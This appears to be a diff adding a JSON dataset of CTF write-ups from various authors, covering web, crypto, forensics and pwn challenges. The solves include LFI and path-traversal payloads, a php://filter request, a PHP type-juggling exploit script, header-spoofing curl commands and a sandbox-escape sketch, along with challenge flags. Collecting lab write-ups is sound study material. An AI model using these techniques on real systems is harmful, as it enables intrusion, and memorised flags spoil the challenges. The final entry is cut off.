@@ -1,0 +1,200 @@
+[
+    {
+        "name": "include-this",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "Try harder!",
+        "tools": "None",
+        "tags": ["Web", "LFI", "File Inclusion"],
+        "solve": "After visiting the webpage, I encounter a button that redirects me to a specific URL (ip:port/file=test.txt) and displays the content of the file upon clicking. This behavior suggests a potential vulnerability such as Local File Inclusion (LFI).\n{image1.png}\nTesting the “file” parameter for LFI, I attempted to modify the parameter value to “flag.txt,” which resulted in an error message. The error indicates that the current directory is /var/www/html/test. {image2.png}\nBy adjusting the parameter value to traverse four directories up and access “flag.txt”, I successfully retrieved the flag.\n {image3.png}"
+    },
+    {
+        "name": "rubies",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "If you like jewelry you will be okay",
+        "tools": "Base64 Decoder, Google, CVE-2019-5418 Exploit",
+        "tags": ["Web", "Ruby on Rails", "CVE-2019-5418", "Exploit"],
+        "solve": "After starting the service, I decoded the page name from base64, revealing “rails”. I saw a large Ruby logo in the middle of the page. After looking up the terms on Google, I found that Ruby on Rails is a server-side web application framework written in Ruby. The image had a link (href attribute) that redirected to /vuln. I found information about a possible vulnerability CVE-2019-5418 (POC) online and started testing. {image4.png}\n\nThe flag was located in /home/gem/flag.txt:\n\nCTF{c5547baa6ce135850b3a728d442925f1ae63f2bf22301676282958a0ce5fae59}"
+    },
+    {
+        "name": "dumb-discord",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "none",
+        "tools": "Discord, Uncompyle6",
+        "tags": ["Code Review", "Cryptography"],
+        "solve": "After downloading \"server.cpython-36.pyc\", I used uncompyle6 to decompile it into Python code. I saw that the function called \"obfuscate\" was XORing the bytes it received as a parameter with the key \"ctf{tryharderdontstring}\", so I used the exact same function to decrypt all the strings.\n\n```from discord.ext import commands\nimport discord, json\nfrom discord.utils import get\n\ndef obfuscate(byt):\n    mask = b'ctf{tryharderdontstring}'\n    lmask = len(mask)\n    return bytes(c ^ mask[i % lmask] for i, c in enumerate(byt))\n\ndef test(s):\n    data = obfuscate(s.encode())\n    return data\n\nintents = discord.Intents.default()\nintents.members = True\ncfg = open(\"config.json\", \"r\")\ntmpconfig = cfg.read()\ncfg.close()\nconfig = json.loads(tmpconfig)\ntoken = config[\"token\"]\nclient = commands.Bot(command_prefix=\"/\")\n\n@client.event\nasync def on_ready():\n    print(\"Connected to bot: {}\".format(client.user.name))\n    print(\"Bot ID: {}\".format(client.user.id))\n\n@client.command()\nasync def getflag(ctx):\n    await ctx.send(\"pong\")\n\n@client.event\nasync def on_message(message):\n    await client.process_commands(message)\n    if \"!ping\" in message.content.lower():\n        await message.channel.send(\"pong\")\n    if \"/getflag\" in message.content.lower():\n        if message.author.id == 783473293554352141:\n            role = discord.utils.get((message.author.guild.roles), name=(\"dctf2020.cyberedu.ro\"))\n            member = discord.utils.get((message.author.guild.members), id=(message.author.id))\n            if role in member.roles:\n                await message.channel.send(test(config[\"flag\"]))\n    if \"/help\" in message.content.lower():\n        await message.channel.send(\"Try harder!\")\n    if \"/s基ay\" in message.content.lower():\n        await message.channel.send(message.content.replace(\"/s基ay\", \"\").replace(\"/getflag\", \"\"))\n\nclient.run(token)\n```\nI found the bot ID, so I used this link to invite it to my server. Then, I created the role \"dctf2020.cyberedu.ro\" that the bot checked for. I played around with the commands and discovered that using \"@DCTFTargetWhyNot /s基ay /getFlag\" doesn’t get filtered and gives you back.\n```b'\\x00\\x00\\x00\\x00E\\x10A\\x0e\\x00E\\x02VA\\x00\\x0eXC\\x17\\x12\\x17\\x0b_\\x03H\\x05C_CAB\\x1d\\x0b\\x07CWSAT\\r[AEG\\x17PVRKU\\x16\\x00L\\x16EOZYC\\x00QB]\\x0bYFK\\x17D\\x14'```After using the same function on the encrypted text, it gave me the flag: ctf{1b8fa7f33da67dfeb1d5f79850dcf13630b5563e98566bf7b76281d409d728c6}"
+    },
+    {
+        "name": "siem-logs",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "We need your investigation skills on the siem2* Kibana index. The attack occurred in 2018, it is recommended to set your timeline prior to this year.",
+        "tools": "Kibana, Elasticsearch",
+        "tags": ["SIEM", "Log Analysis", "Incident Response", "Forensics"],
+        "solve": "I accessed Kibana and navigated to the “Discover” section. Following the challenge description, I changed the index pattern to siem-logs2*. Based on the second question, I searched for the keyword “student”. This search revealed the following details: the IP address 103.53.43.239, the malicious domain name studentvisaconsultantsdelhi, and the CMS used: WordPress."
+    },
+    {
+        "name": "tsunami-researcher",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "Steve Kobbs is a specialist in meteorology. He was called to offer his expertise on the last tsunami which took place in our country. While Steve was working, a mysterious package arrived at the door. Inside, a USB stick was found, containing the following audio file: rain.wav. \n\nFlag format: The correct answer is in plaintext and must be sent to players in the form of `ctf{sha256 of plaintext word}`. \n\nGoal: Use various techniques to analyze audio files in order to recover the flag hidden in `rain.wav`.",
+        "tags": ["Forensics", "Audio Analysis", "Spectrogram", "Steganography"],
+        "tools": "Audacity, Sonic Visualizer, Spectrogram Analysis",
+        "solve": "I opened the file in Audacity and switched the view mode to Spectrogram. After adjusting the window size to get a clearer view, I was able to read the hidden message: 'Secret Code: Spectrogram'. \n\nThe flag turned out to be:\n\n`CTF{sha256(spectrogram)}`\n\nFinal flag:\n\n`CTF{cc3a329919391e291f0a41b7afd3877546f70813f0c06a8454912e0a92099369}`"
+    },
+    {
+        "name": "solve-this",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "Poți te rog să rezolvi acest exercițiu pentru mine?",
+        "solve": "I used CoCalc to decrypt the message. The Sage code used to solve the problem:\n\n```n = 3542351939701992275231003142553\na = 126512569275071152686821540801\nb = 3415839370426921122544181601752\n\nE = EllipticCurve(GF(n), [a, b])\nP = E(2631211060304008450389410782950, 1597897356677072100955051755088)\nQ = E(1249902752727911034264929949680, 3043929197938243211289309561776)\n\nx = Q.log(P)\n\nprint(f\"x: {x}\")```\nI found that x was `588581747331` and submitted the flag:\n\n`flag{sha256(588581747331)}`\n\nFinal flag:\n\n`flag{b2a3253556aeb3bb0f1782c083e90b6de968688d3f435863b82597e6f5efe4c0}`",
+        "tools": "SageMath, CoCalc, Elliptic Curve Cryptography",
+        "tags": ["Cryptography", "Elliptic Curves", "SageMath", "Math"]
+    },
+    {
+        "name": "unconditional",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "All the information you need is in the attachment file.",
+        "solve": "I decompiled the binary (ELF 32-bit) in IDA and obtained the following snippet of code:\n\n```v9 = *argv;\nif ((*argv)[28] == 114 && v9[10] + v9[20] == 156 && v9[36] + v9[7] == 142 && v9[23] + v9[42] == 146 && v9[10] >> 1 == 55 && v9[22] == 101 && *v9 == 67 && (v9[31] ^ 0xA) == v9[22] && v9[40] == 45 && v9[3] - v9[2] == 53 && v9[4] << 7 == 11392 && 2 * v9[3] == 246 && ...\n```\n\nBy reversing the operations in the conditions, I reconstructed the correct input string:\n\n`CTF{You-know-you-got-me-after-you-sha256-me}`\n\nHashing it with SHA-256 produced the flag:\n\n`CTF{e60100e9b047ca672947fdae0f114b3b052d33955c81b6df767843a4ffde439e}`",
+        "tools": "IDA Pro, Reverse Engneering, SHA-256",
+        "tags": ["Reverse Engineering", "Binary Analysis", "Cryptography", "IDA Pro"]
+    },
+    {
+        "name": "cross-or-zero",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "Can you find the key and the flag? I bet. It is not an encryption. It is ZERO.",
+        "solve": "I analyzed the challenge statement and noted the hint: 'It is not an encryption. It is ZERO.' This suggested that the key might be a sequence of zeros. I then wrote a Python script to reverse the XOR operation using the guessed key '0000'.\n\n```python\nimport base64\n\ndef string_xor(s, key):\n    key = (key * (len(s) // len(key) + 1))[:len(s)]\n    return ''.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(s, key))\n\nencrypted_flag = \"dHNkdktTAVUHAABUA1VWVgIHBAlSBAFTBAMFUwECAgcAAAFWAFUFCFMACFFUAwQAVgBSBwQJBVZTAFYGCQYHVQABB1IJTQ==\"\ndecoded_bytes = base64.b64decode(encrypted_flag)\n\ndecoded_string = decoded_bytes.decode('latin1')\n\nkey_guess = \"0000\"  # Guessed key\nflag = string_xor(decoded_string, key_guess)\n\nprint(f\"Flag: {flag}\")\n```\n\nAfter executing the script, I successfully retrieved the flag.",
+        "tools": "Python, Base64, XOR",
+        "tags": ["Cryptography", "XOR", "Base64", "Reverse Engineering"]
+    },
+    {
+        "name": "linux-recovery",
+        "author": "N3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "Recover the flag from the Linux system logs. Reverse engineering is not a solution.",
+        "solve": "The challenge provides two files: a UPX-packed executable called 'chess' and a password-protected .rar archive. Running the 'chess' executable starts a tic-tac-toe game in the terminal. Winning the game by playing in the positions 1, 8, 3, 5, and 2 displays the message: 'Congrats, the secret message is 347774197377.' Additionally, it provides a note: 'VIC, you should like straddles and checkerboards: KCSLQMYOPHTZUBVAFJXGERIWDNSS 3 7.'\n\nRecognizing the VIC cipher, I used '347774197377' as the cipher key, 'KCSLQMYOPHTZUBVAFJXGERIWDNSS' as the alphabet, and 3 & 7 as the spare positions. This resulted in the password 'unicorn.'\n\nEntering 'unicorn' as the secret message returned '$sdfg3e4', which turned out to be the password for the .rar archive. Extracting the .rar file with this password revealed 'logs.txt'. Running:\n\n```bash\nstrings logs.txt | grep -i \"ctf\"\n```\n\nyielded the final flag: `CTF{socskc-343fs-fefewvsw}`.",
+        "tools": "Linux, UPX, VIC Cipher, Strings, grep",
+        "tags": ["Forensics", "Cryptography", "Linux", "Logs"]
+    },
+    {
+        "name": "this-file-hides-something",
+        "author": "n3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "There is an emergency regarding this file. We need to extract the password ASAP. It’s a crash dump, but our tools are not working. Please help us, time is not on our side.",
+        "solve": "After extracting the zip file, I obtained 'crashdump.elf'. From the description, I inferred that I needed to find a password within the crash dump and that the flag format was non-standard.\n\nI used Volatility to extract the LSA secrets with the following command:\n\n```bash\nvol -f crashdump.elf windows.lsadump.Lsadump\n```\n\nThis revealed the flag: `Str0ngAsAR0ck!`.",
+        "tools": "Volatility, Memory Forensics",
+        "tags": ["Forensics", "Memory Analysis", "Volatility", "Crash Dump"]
+    },
+    {
+        "name": "spy-agency",
+        "author": "n3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "A malicious application was sent to our target, who managed to have it before we confiscated the PC. Can you manage to obtain the secret message?",
+        "solve": "After extracting the zip file, I obtained 'crashdump.elf'. From the description, I inferred that I needed to search for an application within the crash dump and that the flag format was `ctf{sha256(location name from coordinates in lowercase)}`.\n\nI ran a filescan using Volatility:\n\n```bash\nvol -f spyagency3.bin windows.filescan.FileScan\n```\n\nThis revealed an interesting file called `app-release.apk.zip` at offset `0x3fefb8c0`. I extracted it using:\n\n```bash\nvol -f spyagency3.bin windows.dumpfiles.DumpFiles --physaddr 0x3fefb8c0\n```\n\nAfter unzipping the archive, I found:\n\n```\napp-release.apk/app-release/res/drawable/coordinates_can_be_found_here.jpg\n```\n\nUsing ExifTool to analyze the image:\n\n```bash\nexiftool coordinates_can_be_found_here.jpg\n```\n\nI extracted the coordinates: `44.44672703736637, 26.098652847616506`. Pasting them into Google Maps revealed the location: **Pizza Hut**.\n\nThe flag was obtained by hashing `pizzahut` with SHA-256:\n\n```\nctf{a939311a5c5be93e7a93d907ac4c22adb23ce45c39b8bfe2a26fb0d493521c4f}\n```",
+        "tools": "Volatility, ExifTool, Google Maps, SHA-256",
+        "tags": ["Forensics", "Memory Analysis", "Volatility", "ExifTool", "OSINT"]
+    },
+    {
+        "name": "access-vip-only",
+        "author": "n3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "We have a malicious employee who attempts to make other people join a secret club. The main message is 'come join us, we have a lot of money.' All we know is that he managed to look at something over the internet.",
+        "solve": "After extracting the archive, I obtained `access-only-vip.bin`, a memory dump. I used Volatility to scan for files:\n\n```bash\nvol -f access-only-vip.bin windows.filescan.FileScan\n```\n\nSince the description mentioned that the 'malicious employee' looked at something online, I decided to dump the browser history with:\n\n```bash\nvol -f access-only-vip.bin windows.dumpfiles.DumpFiles --physaddr 0x7dc4f570\n```\n\nSearching through the history, I found two interesting links:\n\n- https://pastebin.pl/view/29088365\n- https://pastebin.pl/view/9c63cf9c\n\nBoth contained the password: `poiuytrewq`.\n\nLooking again through the file scan, I found `flag.rar` and dumped it using:\n\n```bash\nvol -f access-only-vip.bin windows.dumpfiles.DumpFiles --physaddr 0x7ee72200\n```\n\nI then renamed and extracted it:\n\n```bash\nmv file.0x7ee72200.0xfa8001c6ac90.DataSectionObject.flag.ra.dat flag.rar\nunrar x flag.rar\n```\n\nUsing the password `poiuytrewq`, I extracted `win.txt`, which contained the following hash:\n\n```\nB8FA9EFBC8C8F043AFCA1B60F8F4C5245C54B5FF5BFB0603A71071F66C1EF295\n```\n\nThus, the flag was:\n\n```\nCTF{B8FA9EFBC8C8F043AFCA1B60F8F4C5245C54B5FF5BFB0603A71071F66C1EF295}\n```",
+        "tools": "Volatility, UnRAR, Pastebin",
+        "tags": ["Forensics", "Memory Analysis", "Volatility", "Browser Forensics", "OSINT"]
+    },
+    {
+        "name": "alternating",
+        "author": "n3agu",
+        "link": "https://n3agu.github.io/posts/ctf-writeups/",
+        "description": "We have hidden something in the file, and I’m sure you won’t find it. Make sure to extract the archive using WinRAR. Windows is your friend.",
+        "solve": "After extracting the file, I noticed the hint: 'Windows is your friend.' This suggested that the challenge involved a Windows-specific feature. I suspected the use of NTFS Alternate Data Streams (ADS) and listed them using:\n\n```cmd\ndir /r\n```\n\nThis revealed a hidden stream attached to `Flag.txt.txt`. To extract the flag, I used:\n\n```cmd\nmore < Flag.txt.txt:real_flag.txt:$DATA\n```\n\nThis revealed the flag:\n\n```\nctf{7ce5567830a2f9f8ce8a7e39856adfe5208242f6bce01ca9af1a230637d65a2d}\n```",
+        "tools": "NTFS Alternate Data Streams (ADS), Command Prompt, WinRAR",
+        "tags": ["Forensics", "Windows", "NTFS", "Alternate Data Streams", "File System Analysis"]
+    },
+    {
+        "name": "noogle",
+        "author": "offw0rld",
+        "link": "https://0x90r00t.com/2024/09/30/defcamp-quals-2024-web-noogle-write-up/",
+        "description": "Last week I decided to create my own search engine. It was kinda hard, so I piggybacked on another one. I also tried something on port 8000.",
+        "solve": "The challenge presents a search engine interface similar to Google. Upon using it, we get a list of search results. However, our goal is to access something on `localhost:3000`, which is blocked from direct access.\n\nAnalyzing the requests, we find that searches are processed through a backend API that accepts a single parameter:\n\n```\nurl=https://www.google.com/...\n```\n\nThis restriction prevents us from accessing arbitrary URLs. However, after researching, we discovered that Google’s `ved` parameter allows open redirection.\n\nExploitation Steps:\n1. Perform a Google search for our controlled URL and extract the `ved` parameter from the resulting links.\n2. Construct a search request to the challenge API using Google’s open redirect feature:\n\n```\nhttps://www.google.com/?url=...&ved=...\n```\n\n3. Use this technique to redirect to `localhost:3000`, bypassing restrictions and retrieving the flag:\n\n```\nCTF{9cf16d163cbaecc592ca40bee3de4b1626ee0f4a3b3db23cbd5ad921049ebc0f}\n```",
+        "tools": "Google Search, Open Redirect, Web Exploitation",
+        "tags": ["Web", "Open Redirect", "Google", "API Exploitation", "SSRF"]
+    },
+    {
+        "name": "production-bay",
+        "author": "winw",
+        "link": "https://0x90r00t.com/2024/09/30/defcamp-quals-2024-web-production-bay-write-up/",
+        "description": "Some powerful proxy protects our cat factory production bay, but the strange thing is that we edited some Nginx config in the platform to protect our `/flag` route, and things do not look as secure as expected.",
+        "solve": "The challenge presents a website that generates cat images via an API. By analyzing the source code, we find that the endpoint for the cat factory is located at:\n\n```\n/api/data/cat\n```\n\nFinding Vulnerability\nFuzzing different parameters, we noticed a strange response when accessing `/api/data`, which suggests adding a `?host=xxx` parameter.\n\nWhen passing our own host, we observed remote connections from the Flask app, revealing headers such as:\n- `X-Real-Ip`\n- `X-Forwarded-For`\n- `X-Original-Host`\n\nAfter testing various approaches, including redirecting to `/flag` from our own server, we found an interesting behavior. By attempting:\n\n```\n/api/data/cat../../../flag\n```\n\nWe discovered that the Flask app behind Nginx could be accessed without being denied.\n\nBypassing Nginx Protection\nHowever, an error occurred because we weren’t accessing it from `localhost:5000`. Remembering the headers we retrieved earlier, we tried spoofing the `X-Original-Host` header and successfully accessed the flag:\n\n```bash\ncurl -vvv http://34.159.76.217:32222//api/flag -H 'X-Original-Host: localhost'\n```\n\nResponse:\n```json\n{\n    \"flag\":\"ctf{89b52b00fd39c0410372b898632e6bf0648ae9f43d500762d03af9e7768bcbfd}\",\n    \"request.host\":\"localhost:5000\"\n}\n```\n\nThe final flag was:\n\n```\nctf{89b52b00fd39c0410372b898632e6bf0648ae9f43d500762d03af9e7768bcbfd}\n```",
+        "tools": "Burp Suite, cURL, Nginx Header Manipulation",
+        "tags": ["Web", "Nginx", "Header Injection", "Path Traversal", "Flask"]
+    },
+    {
+        "name": "alien-inclusion",
+        "author": "JorgeCTF",
+        "link": "https://jorgectf.github.io/blog/post/cyberedu-web-challenges/",
+        "description": "Keep it local and you should be fine. The flag is in `/var/www/html/flag.php`.",
+        "solve": "The challenge presents a PHP script that includes a user-supplied file:\n```php\n<?php\nif (!isset($_GET['start'])){\n    show_source(__FILE__);\n    exit;\n} \ninclude ($_POST['start']);\necho $secret;```\nSince the flag is stored in `/var/www/html/flag.php`, we can attempt to include this path via a POST request.\n\nExploitation Steps:\n1. The `include ($_POST['start']);` statement allows us to control which file is included.\n2. Since `flag.php` defines `$secret` and `echo $secret;` prints it, we can include it directly.\n3. We craft the following request to retrieve the flag:\n```POST /?start HTTP/1.1\nHost: 34.141.31.183:31166\n...\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\nstart=php://filter/convert.base64-encode/resource=/var/www/html/flag.php```\nResponse:\nAfter decoding the base64-encoded response, we retrieve the flag:\n\n```php\n<?php \n    $secret=\"ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}\";\n?>\n```Alternative Approach:\nWe also attempted using `php://filter/resource=/var/www/html/flag.php` to read the file directly. However, since `include()` parses the PHP file, it only returns the value of `$secret`, which gives us the flag directly.",
+        "tools": "Burp Suite, PHP Filters, Local File Inclusion (LFI)",
+        "tags": ["Web", "LFI", "PHP Filters", "File Inclusion", "Code Execution"]
+    },
+    {
+        "name": "puzzled",
+        "author": "JorgeCTF",
+        "link": "https://jorgectf.github.io/blog/post/cyberedu-web-challenges/",
+        "description": "How puzzled can you get with PHP?",
+        "solve": "The challenge presents a PHP script with multiple security checks before revealing the flag. It includes `secrets.php`, which contains critical values like `$secret_token`, `$User`, `$Pass`, and `$flag`. The goal is to bypass all security checks using **Type Juggling**.\n\nFirst Bypass:\n```php\nif (isset($_GET['pass'])){\n    $pass = generateRandomString(95);\n    $user_input = json_decode($_GET['pass']);\n    if ($pass != $user_input->pass) {\n        header('HTTP/1.0 403 Forbidden');\n        exit;\n    }\n} else {\n    show_source(__FILE__);\n    exit;\n}\n```\n`json_decode($_GET['pass'])->pass` must equal `$pass`. Since `$pass` is likely a string, we can use `0` or `true` for a loose comparison match: `{\"pass\":0}`.\n\nSecond Bypass:\n```php\nif ($user_input->token != $secret_token) {\n    echo strlen($secret_token);\n    header('HTTP/1.0 403 Forbidden');\n    exit;\n}\n```\nSimilarly, since `$secret_token` is an unknown string, passing `{\"token\":true}` will bypass this check.\n\nThird Bypass:\n```php\n$key = $secret_token;\nif (isset($_GET['key'])) {\n    $key = hash_hmac('ripemd160', $_GET['key'], $secret_token);\n}\n$hash = hash_hmac('ripemd160', $user_input->check, $key);\nif ($hash !== $user_input->hash) {\n    header('HTTP/1.0 403 Forbidden');\n    exit;\n}\n```\nTo control `$hash`, we pass an **array** as `key`, causing `hash_hmac()` to generate an empty string as the key. This lets us create a matching hash:\n\n```json\n{\"hash\":\"\"}\n```\n\nFourth Bypass (Unserialization Vulnerability):\n```php\n$login = unserialize($user_input->check);\nif ($login['user'] == $User && $login['pass'] == $Pass) {\n    $admin = true;\n} else {\n    header('HTTP/1.0 403 Forbidden');\n    exit;\n}\n```\nWe pass a serialized object:\n\n```php\nserialize(array('user' => true, 'pass' => true))\n```\nSince `$User` and `$Pass` are likely strings, this bypasses the check.\n\nFinal Bypass:\n```php\nif($admin){\n    if (isset($_GET['something'])) {\n        if (strcmp($_GET['something'], $secret_token) == 0) {\n            echo $flag;\n        } else {\n            echo 'Try Harder!';\n        }\n    }\n}\n```\nPassing `something[]` breaks `strcmp()`, making `NULL == 0`, which lets us retrieve the flag.\n\nExploit Script:\n```php\n<?php\n$url = \"http://mirror/\";\nfunction post_request($url, $data) {\n    return file_get_contents($url . \"?\" . http_build_query($data), false);\n}\n$obj = serialize(array('user' => true, 'pass' => true));\n$data = array(\n    'pass' => json_encode(\n        array(\n            'pass' => 0,\n            'token' => true,\n            'check' => $obj,\n            'hash' => hash_hmac('ripemd160', $obj, '')\n        )\n    ),\n    'key[]' => '',\n    'something[]' => ''\n);\n$result = post_request($url, $data);\nvar_dump($result);\n?>\n```",
+        "tools": "Burp Suite, PHP Type Juggling, Unserialization Exploitation",
+        "tags": ["Web", "PHP", "Type Juggling", "Unserialization", "Code Execution"]
+    },
+    {
+        "name": "old-tickets",
+        "author": "Stefan",
+        "link": "https://stefanin.com/posts/old-tickets-writeup/",
+        "description": "A web challenge involving a ticketing system where the goal is to retrieve the flag by exploiting the system's behavior.",
+        "tools": "Burp Suite, Python, Hash-Identifier",
+        "tags": ["Web", "MD5", "Bruteforce", "Timestamp"],
+        "solve": "First, I analyzed the source code and discovered a hash hidden in a comment: `d63af914bd1b6210c358e145d61a8abc`. {image5.png}\n\nNext, I intercepted the requests using Burp Suite and noticed that the ticket submission was done via a `GET` request, which is unusual. I tried sending an `OPTIONS` request, revealing that the server allowed `PUT` and `POST` methods. {image6.png}\n\nAfter experimenting with different request methods, I sent a `POST` request with a `code` parameter set to the hash value. The server responded with 'Try harder!', indicating that the code was close but not correct.\n\nI identified the hash as an MD5 hash using hash-identifier tools. By decrypting the hash online, I obtained a timestamp value. I then wrote a Python script to bruteforce the correct timestamp by hashing incremental values and sending them to the server. {image7.png}\n\nFinally, the correct timestamp returned the flag: `ctf{4086d9012b250dc1d821340f23b4af9b29d780552434175cb713b6d7502885c9}`."
+    },
+    {
+        "name": "cargo",
+        "author": "Stefan",
+        "link": "https://stefanin.com/posts/cargo-writeup/",
+        "description": "A web application in 'maintenance' mode with a hidden path that allows Rust code execution on the server.",
+        "tools": "Dirbuster, Burp Suite, CyberChef",
+        "tags": ["Web", "Rust", "RCE"],
+        "solve": "Upon accessing the web application, it displayed a 'maintenance' mode message. Suspecting hidden paths, I utilized Dirbuster to scan the application and discovered the `/editor` endpoint. {image8.png}\n\nThis endpoint presented a code execution playground, accepting and running Rust code. To verify, I sent a POST request to `/editor` with the parameter `codename=a`, and the server executed the provided Rust code. {image9.png}\n\nRecognizing the capability to execute Rust code, I crafted a script to read the contents of the root directory. This revealed a folder named `flag39283761`. Further exploration within this directory uncovered a file named `flag2781263`. {image10.png}\n\nSubsequently, I wrote another Rust script to read the contents of the `flag2781263` file. Executing this script returned the flag: `CTF{c7d604ecd0da6804f45d958b4c5fb622488250bd05c29b99d0134f3bfdda2fc4}`."
+    },
+    {
+        "name": "custom-endian",
+        "author": "CyberEDU",
+        "link": "https://osc.rocsc.ro/rezolvari.pdf",
+        "description": "Cineva a realizat niște modificări pe fișierul custom.png atașat. Mă puteți ajuta să recuperez mesajul secret din el?",
+        "solve": "1. Descarcă fișierul custom.png\n2. Analizează imaginea într-un editor hex\n   - Observi că octeții semnăturii PNG 89 50 4E 47 0D 0A 1A 0A au fost modificați folosind un pattern:\n\n   ```\n   [i] = [i]\n   [i+1] = [i+3]\n   [i+2] = [i+1]\n   [i+3] = [i+2]\n   ```\n\n   - Se presupune că această transformare s-a aplicat asupra întregului fișier .png.\n\n3. Scrie un script Python pentru a corecta ordinea octeților:\n\n   ```python\n   def custom_to_big_endian(custom_endian_bytes):\n       if len(custom_endian_bytes) % 4 != 0:\n           raise ValueError(\"Length of bytes should be multiple of 4\")\n       big_endian_bytes = bytearray(len(custom_endian_bytes))\n       for i in range(0, len(custom_endian_bytes), 4):\n           big_endian_bytes[i] = custom_endian_bytes[i]\n           big_endian_bytes[i+1] = custom_endian_bytes[i+2]\n           big_endian_bytes[i+2] = custom_endian_bytes[i+3]\n           big_endian_bytes[i+3] = custom_endian_bytes[i+1]\n       return big_endian_bytes\n   \n   def convert_png_byte_order(input_file, output_file):\n       with open(input_file, 'rb') as f:\n           png_data = bytearray(f.read())\n       while len(png_data) % 4 != 0:\n           png_data.append(0)  # Zero padding\n       big_endian_data = custom_to_big_endian(png_data)\n       with open(output_file, 'wb') as f:\n           f.write(big_endian_data)\n   \n   # Utilizare\n   input_filename = 'custom.png'\n   output_filename = 'output.png'\n   convert_png_byte_order(input_filename, output_filename)\n   ```\n\n4. Extrage metadatele imaginii corectate folosind exiftool:\n\n   ```bash\n   exiftool output.png\n   ```\n\n5. Obține flag-ul: ctf{cfb7d769f497097e0866e22090bc1e8e17c44c6c20f6817a195cc511e8062225}",
+        "tools": "Hex Editor, Python, ExifTool",
+        "tags": ["Forensics", "PNG", "Binary Manipulation", "Metadata Extraction"]
+    },
+    {
+        "name": "luma-chain",
+        "author": "minipif",
+        "link": "https://blog.minipif.xyz/pwn/2025/03/30/writeups-unr-solo25.html",
+        "description": "",
+        "tools": "Python, C, shared memory, audit hooks",
+        "tags": ["Pwn", "Python", "Sandbox Escape", "Memory Corruption", "CTF"],
+        "solve": "The challenge presented a custom blockchain binary offering options like `view balance`, `add balance`, `shit post`, and `create contract`. The `create contract` function executed user-provided Python code within a restricted environment:\n\n```python\nexec(\n    compiled,\n    {\n        \"__builtins__\": {\n            \"__build_class__\": __build_class__,\n            \"__name__\": __name__,\n            \"id\": id,\n        },\n        \"input\": input,\n        \"result\": result,\n    },\n    {\"__builtins__\": {}},\n)\n```\n\nAudit hooks were implemented to block most function calls, except for `builtins.id`, `cpython.PyInterpreterState_Clear`, and `cpython._PySys_ClearAuditHooks`. However, the last two are internal Cython calls and inaccessible from standard Python:\n\n```c\nstatic int audit(const char *event, PyObject *args, void *userData) {\n  printf(\"arg1 = %s\\n\", event);\n\n  if (!strcmp(event, \"builtins.id\")) {\n    return 0;\n  }\n\n  if (!strcmp(event, \"cpython.PyInterpreterState_Clear\")) {\n    return 0;\n  }\n\n  if (!strcmp(event, \"cpython._PySys_ClearAuditHooks\")) {\n    return 0;\n  }\n\n  if (running) {\n    printf(\"Luma mogged u lol\\n\");\n    exit(1);\n  }\n\n  if (!running && !strcmp(event, \"exec\"))\n    running = 1;\n\n  return 0;\n}\n```\n\nThe blockchain interacted with an internal program via shared memory, writing the output of the contract:\n\n```python\nresult = result[:56]\n\nshmem.seek(0)\nshmem.write(struct.pack(\"@I\", type) + struct.pack(\"@I\", len(result)) + result)\n\nshmem.close()\n```\n\nA buffer overflow was identified in the internal program's parser function, where `memcpy` was used without checking if `message_length > 56`:\n\n```c\nvoid handle_message() {\n  char buf[56];\n\n  uint32_t message_type = ((volatile uint32_t *)shared_memory)[0];\n  uint32_t message_length = ((volatile uint32_t *)shared_memory)[1];\n\n  memcpy(buf, (void *)&shared_memory[8], message_length);\n\n  switch (message_type) {\n  case MESSAGE_TYPE_ADD: {\n    lumacash += *(uint64_t *)&buf[0];\n  } break;\n  case MESSAGE_TYPE_SHITPOST: {\n    memcpy(last_shitpost, buf, message_length);\n    system(\"curl -X POST -d \\\"ban_my_account=True\\\" luciphp://cyber-edu.avadanei.co:69420\");\n  } break;\n  case MESSAGE_TYPE_GET: {\n    memcpy((void *)shared_memory, &lumacash, sizeof(lumacash));\n    msync((void *)shared_memory, SHARED_MEMORY_SIZE, MS_SYNC);\n  } break;\n  }\n}\n```\n\nHowever, exploiting this overflow was not straightforward due to the Python code truncating the `result` to 56 bytes:\n\n```python\nresult = result[:56]\n```\n\nTo bypass the restrictions, I leveraged the accessible functions: `__build_class__`, `__name__`, and `id`. By accessing `__build_class__.__self__`, I could retrieve built-in functions and objects:\n\n```python\ngi = lambda o, k: __build_class__.__self__.dict.__getitem__(__build_class__.__self__.dict(__build_class__.__self__.vars(o)), k)\nprint = __build_class__.__self__.print\nbytearray = __build_class__.__self__.bytearray\nbaset =  __build_class__.__self__.bytearray.__setitem__\nbaget =  __build_class__.__self__.bytearray.__getitem__\ndict = __build_class__.__self__.dict\nsa = dict.__setitem__\nga = __build_class__.__self__.getatt\n```\n\nInitially, I attempted to overwrite the class of the `result` array to modify the `__getitem__` constructor, aiming to bypass the truncation. However, this approach was not feasible due to audit hooks preventing the necessary modifications.\n\nRe-evaluating the available functions, I focused on the `id` function, which returns the memory address of its argument. This provided a primitive form of arbitrary read. Although seemingly limited without write capabilities, I explored the possibility of triggering a use-after-free (UAF) vulnerability to achieve arbitrary write, exploiting Python's memory management.\n\nBy carefully crafting objects and manipulating their lifecycle, I managed to exploit the UAF, leading to memory corruption. This allowed me to bypass the sandbox restrictions and ultimately retrieve the flag."
+      },
+      {
+        "name": "treasure-hunt",
+        "author":"minipif",
+        "link":"https://blog.minipif.xyz/pwn/2025/03/30/writeups-unr-solo25.html",
+        "description":"",
+        "tools": "JohnTheRipper, stegsolve",
+        "tags": ["Steganography"],
